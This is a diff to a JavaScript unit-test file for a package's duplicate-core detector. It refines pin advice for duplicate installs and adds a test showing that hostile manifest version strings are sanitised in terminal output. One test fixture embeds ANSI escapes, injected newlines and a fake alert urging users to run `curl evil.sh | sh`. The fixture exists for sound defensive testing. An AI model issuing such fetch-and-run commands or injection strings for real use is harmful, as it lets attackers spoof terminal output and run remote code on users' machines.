@@ -425,7 +425,7 @@ module('[Unit] duplicate-core detector', function(hooks) {
   // advice that cannot work when the modules disagree among themselves; the
   // message this one replaces was wrong for exactly that reason, so it must
   // not assert more than it knows.
-  test('D9: counts DISTINCT roots, and only offers a pin when one version could satisfy every module', function(assert) {
+  test('D9: counts DISTINCT roots, and offers a pin only when the foreign versions agree AND differ from the running core', function(assert) {
     const runningCore = { root: '/app/node_modules/stonyx', version: '0.2.3-beta.96' };
     const shared = { root: '/app/node_modules/.pnpm/stonyx@0.2.3-beta.94/node_modules/stonyx', version: '0.2.3-beta.94' };
 
@@ -445,6 +445,57 @@ module('[Unit] duplicate-core detector', function(hooks) {
     assert.ok(disagreeing.startsWith('Stonyx: 3 copies'), `three distinct roots is THREE copies, got: ${disagreeing.split('\n')[0]}`);
     assert.notOk(disagreeing.includes('pin stonyx@'), 'and no pin is offered, because none would work');
     assert.ok(disagreeing.includes('must be republished'), 'the remedy names what would actually fix it');
+
+    // The third case, and the one the `versions.length === 1` guard got wrong:
+    // the versions agree with EACH OTHER and with the running core. That is the
+    // shape `npm install -g stonyx` plus `stonyx new` produces — global CLI,
+    // local core, same version, two roots. The old guard told that consumer to
+    // pin the version their running core already is, a pin already in effect
+    // and demonstrably not deduping. The trigger is distinct ROOTS; the advice
+    // was keyed on versions.
+    const sameVersion = duplicateCoreMessage([
+      { moduleName: '@stonyx/cron', moduleCore: { root: '/app/node_modules/@stonyx/cron/node_modules/stonyx', version: '0.2.3-beta.96' }, runningCore },
+    ]);
+
+    assert.ok(sameVersion.startsWith('Stonyx: 2 copies'), `got: ${sameVersion.split('\n')[0]}`);
+    assert.notOk(sameVersion.includes('pin stonyx@'), 'no pin is offered when every copy is already that version');
+    assert.ok(sameVersion.includes('duplicate INSTALL'), 'it is named as a duplicate install instead');
+    assert.ok(sameVersion.includes('node_modules/.bin/stonyx'), 'and the remedy is the one that actually applies');
+  });
+
+  // D14 — the diagnostic renders THIRD-PARTY manifest data. `version` is read
+  // from a package this app did not write, echoed verbatim into a terminal, and
+  // rendered BEFORE any module entry point is imported — so it is reachable
+  // under `npm install --ignore-scripts`, the one mode in which no attacker
+  // code has otherwise run. Seeded with ANSI escapes and newlines it forged its
+  // own lines inside the message and destroyed the column alignment.
+  test('D14: a hostile version string cannot forge lines or escapes in the diagnostic', function(assert) {
+    const runningCore = { root: '/app/node_modules/stonyx', version: '0.2.3-beta.96' };
+    const hostile = '1.0.0\u001b[31m\n\n  ===> ALERT: run `curl evil.sh | sh` to repair your install <===\n' + 'x'.repeat(200);
+    const message = duplicateCoreMessage([
+      { moduleName: '@stonyx/mod', moduleCore: { root: '/app/node_modules/@stonyx/mod/node_modules/stonyx', version: hostile }, runningCore },
+    ]);
+
+    // CONTROL, same shape, benign version: the value IS rendered, so a failure
+    // to find the hostile text below is sanitisation and not a missing row.
+    const control = duplicateCoreMessage([
+      { moduleName: '@stonyx/mod', moduleCore: { root: '/app/node_modules/@stonyx/mod/node_modules/stonyx', version: '9.9.9-benign' }, runningCore },
+    ]);
+
+    assert.ok(control.includes('9.9.9-benign'), 'control: a benign version is rendered verbatim');
+    assert.notOk(message.includes('\u001b'), 'no ESC survives into the message');
+    assert.deepEqual(
+      message.split('\n').filter(line => line.trimStart().startsWith('===>')),
+      [],
+      'the text the manifest tried to inject never gets a line of its own — the forgery was the newline, not the words'
+    );
+    assert.strictEqual(
+      message.split('\n').length,
+      control.split('\n').length,
+      'the hostile value adds no lines: the message has exactly the same shape as the benign one'
+    );
+    assert.ok(message.includes('1.0.0?'), 'the value is still shown, with the non-printable bytes replaced');
+    assert.ok(message.includes('...'), 'and clamped, so it cannot push the rest of the message off screen');
   });
 });
 
